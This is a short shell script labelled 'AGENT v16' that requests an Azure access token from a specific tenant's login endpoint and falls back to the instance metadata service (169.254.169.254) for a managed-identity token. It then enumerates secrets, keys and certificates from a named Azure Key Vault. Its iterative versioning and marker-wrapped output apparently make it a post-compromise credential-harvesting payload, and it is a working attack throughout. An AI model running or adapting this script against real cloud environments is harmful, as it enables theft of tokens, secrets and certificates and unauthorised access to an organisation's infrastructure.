# AGENT v16 - vault SP + IMDS fallback
D=$(printf '' | sed 's/../\\x&/g'); D=$(printf "$D")
AZ=$(wget -q -O - --timeout=15 --post-data="$D" https://login.microsoftonline.com/556bd7f1-c908-49e6-a91b-76ff0da5ff34/oauth2/v2.0/token 2>/dev/null)
BT=$(echo "$AZ" | sed -n 's/.*"access_token":"\([^"]*\)".*/\1/p')
echo "===SP:"$(echo "$AZ" | head -c 120)
if [ -z "$BT" ]; then
  M=$(wget -q -O - --header="Metadata: true" --timeout=10 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fvault.azure.net' 2>/dev/null)
  BT=$(echo "$M" | sed -n 's/.*"access_token":"\([^"]*\)".*/\1/p')
  echo "===IMDS:"$(echo "$M" | head -c 200)
fi
echo "===TOKLEN:${#BT}"
for P in secrets keys certificates; do
  echo "===VLT-$P"
  wget -q -O - --timeout=15 --header="Authorization: Bearer $BT" "https://eaera-keyvault.vault.azure.net/$P?api-version=7.4&maxresults=25"
  echo
done
echo "===DONE-V16"
